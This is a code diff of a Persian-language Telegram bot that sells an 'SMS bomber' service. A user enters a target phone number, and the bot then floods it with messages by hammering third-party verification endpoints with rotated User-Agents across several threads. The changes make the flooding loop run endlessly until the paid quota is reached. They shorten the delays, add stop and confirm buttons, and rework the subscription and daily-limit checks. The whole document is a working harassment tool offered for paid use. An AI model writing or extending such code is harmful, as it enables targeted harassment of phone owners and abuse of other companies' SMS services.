@@ -185,7 +185,7 @@ def send_join_message(chat_id):
                      reply_markup=m, parse_mode='Markdown')
 
 # ==========================================
-# 6. بمبر
+# 6. بمبر (با نوار وضعیت زنده، تایید شماره و دکمه توقف)
 # ==========================================
 class Bomber:
     def __init__(self, phone, user_id, sms_limit, silent_mode=False):
@@ -194,7 +194,6 @@ class Bomber:
         self.silent_mode = silent_mode
         self.sms_limit = sms_limit
         self.services = SERVICES_LIST
-        self.session = requests.Session()
         self.success = 0
         self.fail = 0
         self.sent_total = 0
@@ -208,17 +207,22 @@ class Bomber:
             if self.sent_total >= self.sms_limit:
                 self.stop_event.set()
                 return
+
         try:
             data = svc['data'](self.phone)
             headers = {'User-Agent': random.choice(USER_AGENTS)}
             method = svc['method'].upper()
-            if method == 'POST':
-                if svc.get('json', False):
-                    r = self.session.post(svc['url'], json=data, headers=headers, timeout=5)
+            
+            # استفاده از Session جداگانه برای جلوگیری از خرابی APIها
+            with requests.Session() as session:
+                if method == 'POST':
+                    if svc.get('json', False):
+                        r = session.post(svc['url'], json=data, headers=headers, timeout=5)
+                    else:
+                        r = session.post(svc['url'], data=data, headers=headers, timeout=5)
                 else:
-                    r = self.session.post(svc['url'], data=data, headers=headers, timeout=5)
-            else:
-                r = self.session.get(svc['url'], params=data, headers=headers, timeout=5)
+                    r = session.get(svc['url'], params=data, headers=headers, timeout=5)
+            
             if r.status_code in (200, 201, 202, 204):
                 with self.lock:
                     self.success += 1
@@ -233,11 +237,13 @@ class Bomber:
                 self.fail += 1
 
     def _worker(self):
-        for svc in self.services:
-            if self.stop_event.is_set():
-                break
-            self._send(svc)
-            time.sleep(random.uniform(0.3, 1.0))
+        # لوپ بی‌نهایت تا زمان رسیدن به سقف پیامک
+        while not self.stop_event.is_set():
+            for svc in self.services:
+                if self.stop_event.is_set():
+                    break
+                self._send(svc)
+                time.sleep(random.uniform(0.1, 0.4))
 
     def start(self):
         try:
@@ -248,18 +254,29 @@ class Bomber:
                 self.phone = "+98" + self.phone.lstrip("0")
 
             self.success = self.fail = self.sent_total = 0
+            
+            # دکمه توقف
+            stop_markup = types.InlineKeyboardMarkup()
+            stop_markup.add(types.InlineKeyboardButton("⏹ توقف ارسال", callback_data="stop_bomb_btn"))
+
             status = bot.send_message(self.user_id,
-                f"⏳ **در حال ارسال...**\n📨 0/{self.sms_limit} پیامک", parse_mode='Markdown')
+                f"⏳ **در حال ارسال...**\n📨 0/{self.sms_limit} پیامک", 
+                reply_markup=stop_markup, parse_mode='Markdown')
 
             threads = []
-            for _ in range(15):
+            for _ in range(5):
                 t = threading.Thread(target=self._worker)
                 t.start()
                 threads.append(t)
 
-            last = time.time()
+            last_update = time.time()
+            
+            # لوپ اصلی برای آپدیت نوار وضعیت
             while any(t.is_alive() for t in threads):
-                if time.time() - last > 2:
+                if self.stop_event.is_set():
+                    break
+                    
+                if time.time() - last_update > 2:
                     pct = int(self.sent_total / self.sms_limit * 100) if self.sms_limit else 0
                     bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                     try:
@@ -267,19 +284,21 @@ class Bomber:
                             f"⏳ **در حال ارسال...**\n\n"
                             f"📨 پیامک ارسال‌شده: **{self.sent_total}/{self.sms_limit}**\n"
                             f"✅ موفق: {self.success} | ❌ ناموفق: {self.fail}\n"
-                            f"[{bar}] {pct}%\n\n"
-                            "برای توقف /stop_bomb",
-                            self.user_id, status.message_id, parse_mode='Markdown')
+                            f"[{bar}] {pct}%\n\n",
+                            self.user_id, status.message_id, 
+                            reply_markup=stop_markup, parse_mode='Markdown')
                     except Exception:
                         pass
-                    last = time.time()
-                time.sleep(1)
+                    last_update = time.time()
+                
+                time.sleep(0.5)
 
             for t in threads:
                 t.join()
 
             pct = int(self.sent_total / self.sms_limit * 100) if self.sms_limit else 0
             stopped = " (متوقف شد)" if self.stop_event.is_set() and self.sent_total < self.sms_limit else ""
+            
             try:
                 bot.edit_message_text(
                     f"🏁 **پایان{stopped}!**\n\n"
@@ -287,12 +306,14 @@ class Bomber:
                     f"✅ موفق: {self.success}\n"
                     f"❌ ناموفق: {self.fail}\n"
                     f"📊 درصد موفقیت: {pct}%",
-                    self.user_id, status.message_id, parse_mode='Markdown')
+                    self.user_id, status.message_id, 
+                    reply_markup=None, parse_mode='Markdown')
             except Exception:
                 pass
 
             add_xp(self.user_id, 5)
             add_transaction(self.user_id, 0, "bomb", f"بمبر به {self.phone} — {self.sent_total} پیامک")
+            
         except Exception as e:
             print(f"Bomber error: {e}")
         finally:
@@ -515,6 +536,84 @@ def on_callback(call):
         else:
             bot.answer_callback_query(call.id, "❌ هنوز عضو نشدی!", show_alert=True)
 
+    # ================= بمبر (شروع و تایید) =================
+    elif data == "menu_bomb":
+        if not u:
+            return
+        if u['plan'] == "free" and u['free_trial_used']:
+            bot.answer_callback_query(call.id, "❌ تست رایگان تمام شد! اشتراک بخر.", show_alert=True)
+            return
+        if u['plan'] != "free" and u['sub_expiry'] <= time.time():
+            bot.answer_callback_query(call.id, "❌ اشتراکت منقضی شده! تمدید کن.", show_alert=True)
+            return
+        today = datetime.now().strftime("%Y-%m-%d")
+        limit = PLANS.get(u['plan'], {}).get('daily_limit', 1)
+        if u.get('last_daily_bomb_date') == today and u['daily_bomb_count'] >= limit:
+            bot.answer_callback_query(call.id, f"❌ سقف روزانه ({limit} بار) پر شده! فردا بیا.", show_alert=True)
+            return
+        sms = PLANS.get(u['plan'], {}).get('sms_per_run', 50)
+        user_states[uid] = {"state": "wait_phone"}
+        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
+        bot.edit_message_caption(
+            f"🚀 **شماره هدف را وارد کن:**\n\n"
+            f"📨 این اجرا: **{sms} پیامک**\n"
+            f"🔄 استفاده امروز: **{u['daily_bomb_count']}/{limit}**\n\n"
+            f"مثال: 09123456789",
+            call.message.chat.id, call.message.message_id,
+            reply_markup=m, parse_mode='Markdown')
+
+    elif data.startswith("confirm_start_"):
+        num = data.replace("confirm_start_", "")
+        
+        # بررسی‌های امنیتی دوباره
+        if u['plan'] == "free" and u['free_trial_used']:
+            bot.answer_callback_query(call.id, "❌ تست رایگان تمام شد!", show_alert=True)
+            return
+        if u['plan'] != "free" and u['sub_expiry'] <= time.time():
+            bot.answer_callback_query(call.id, "❌ اشتراک منقضی شده!", show_alert=True)
+            return
+            
+        plan_info = PLANS.get(u['plan'], PLANS['free'])
+        today = datetime.now().strftime("%Y-%m-%d")
+
+        if u.get('last_daily_bomb_date') == today:
+            if u['daily_bomb_count'] >= plan_info['daily_limit']:
+                bot.answer_callback_query(call.id, f"❌ سقف روزانه ({plan_info['daily_limit']} بار) پر شده!", show_alert=True)
+                return
+            u['daily_bomb_count'] += 1
+        else:
+            u['daily_bomb_count'] = 1
+            u['last_daily_bomb_date'] = today
+
+        if u['plan'] == "free":
+            u['free_trial_used'] = 1
+
+        save_user(**u)
+        
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+            
+        b = Bomber(num, uid, plan_info['sms_per_run'], u['silent_mode'])
+        active_bombers[uid] = b
+        user_states.pop(uid, None)
+        threading.Thread(target=b.start).start()
+
+    elif data == "stop_bomb_btn":
+        if uid in active_bombers:
+            active_bombers[uid].stop_event.set()
+            bot.answer_callback_query(call.id, "⏹ درخواست توقف ارسال شد. منتظر بمانید...", show_alert=True)
+        else:
+            bot.answer_callback_query(call.id, "❌ بمبر فعالی برای شما یافت نشد.", show_alert=True)
+
+    elif data == "menu_schedule":
+        user_states[uid] = {"state": "wait_sched_phone"}
+        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
+        bot.edit_message_caption("⏰ **شماره هدف برای زمان‌بندی:**",
+                                 call.message.chat.id, call.message.message_id,
+                                 reply_markup=m, parse_mode='Markdown')
+
     # ================= کیف پول =================
     elif data == "menu_wallet":
         text = (f"💳 **کیف پول:**\n\nموجودی: **{fmt(u['wallet'])}** تومان\n\n"
@@ -684,39 +783,6 @@ def on_callback(call):
         m.add(types.InlineKeyboardButton("🔕 تغییر حالت بی‌صدا", callback_data="toggle_silent"))
         m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
         bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
-                                 reply_markup=m, parse_mode='Markdown')
-
-    # ================= بمبر =================
-    elif data == "menu_bomb":
-        if not u:
-            return
-        if u['plan'] == "free" and u['free_trial_used']:
-            bot.answer_callback_query(call.id, "❌ تست رایگان تمام شد! اشتراک بخر.", show_alert=True)
-            return
-        if u['plan'] != "free" and u['sub_expiry'] <= time.time():
-            bot.answer_callback_query(call.id, "❌ اشتراکت منقضی شده! تمدید کن.", show_alert=True)
-            return
-        today = datetime.now().strftime("%Y-%m-%d")
-        limit = PLANS.get(u['plan'], {}).get('daily_limit', 1)
-        if u.get('last_daily_bomb_date') == today and u['daily_bomb_count'] >= limit:
-            bot.answer_callback_query(call.id, f"❌ سقف روزانه ({limit} بار) پر شده! فردا بیا.", show_alert=True)
-            return
-        sms = PLANS.get(u['plan'], {}).get('sms_per_run', 50)
-        user_states[uid] = {"state": "wait_phone"}
-        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_caption(
-            f"🚀 **شماره هدف را وارد کن:**\n\n"
-            f"📨 این اجرا: **{sms} پیامک**\n"
-            f"🔄 استفاده امروز: **{u['daily_bomb_count']}/{limit}**\n\n"
-            f"مثال: 09123456789",
-            call.message.chat.id, call.message.message_id,
-            reply_markup=m, parse_mode='Markdown')
-
-    elif data == "menu_schedule":
-        user_states[uid] = {"state": "wait_sched_phone"}
-        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_caption("⏰ **شماره هدف برای زمان‌بندی:**",
-                                 call.message.chat.id, call.message.message_id,
                                  reply_markup=m, parse_mode='Markdown')
 
     # ================= خرید اشتراک =================
@@ -1047,7 +1113,7 @@ def on_callback(call):
 
     else:
         bot.answer_callback_query(call.id, "در حال توسعه...")
-# ==========================================        
+        # ==========================================
 # 12. عکس (رسید)
 # ==========================================
 @bot.message_handler(content_types=['photo'])
@@ -1114,30 +1180,23 @@ def on_text(message):
             return
 
         plan_info = PLANS.get(u['plan'], PLANS['free'])
-        today = datetime.now().strftime("%Y-%m-%d")
+        sms = plan_info['sms_per_run']
 
-        if u.get('last_daily_bomb_date') == today:
-            if u['daily_bomb_count'] >= plan_info['daily_limit']:
-                bot.send_message(message.chat.id, f"❌ سقف روزانه پر شده.")
-                user_states.pop(uid, None)
-                return
-            u['daily_bomb_count'] += 1
-        else:
-            u['daily_bomb_count'] = 1
-            u['last_daily_bomb_date'] = today
-
-        if u['plan'] == "free":
-            if u['free_trial_used']:
-                bot.send_message(message.chat.id, "❌ تست رایگان تمام شد.")
-                user_states.pop(uid, None)
-                return
-            u['free_trial_used'] = 1
-
-        save_user(**u)
-        b = Bomber(num, uid, plan_info['sms_per_run'], u['silent_mode'])
-        active_bombers[uid] = b
-        user_states.pop(uid, None)
-        threading.Thread(target=b.start).start()
+        # ذخیره شماره در استیت و نمایش پیام تایید
+        user_states[uid] = {"state": "confirm_bomb", "phone": num}
+        
+        m = types.InlineKeyboardMarkup(row_width=2)
+        m.add(
+            types.InlineKeyboardButton("✅ تایید و شروع", callback_data=f"confirm_start_{num}"),
+            types.InlineKeyboardButton("❌ انصراف", callback_data="menu_back")
+        )
+        
+        bot.send_message(message.chat.id, 
+            f"⚠️ **آیا از ارسال اطمینان دارید؟**\n\n"
+            f"📱 شماره هدف: `{num}`\n"
+            f"📨 تعداد پیامک در این اجرا: **{sms}**\n\n"
+            f"آیا می‌خواهید بمبر روی این شماره اجرا شود؟",
+            reply_markup=m, parse_mode='Markdown')
 
     elif st == "wait_sched_phone":
         num = text.lstrip("+")
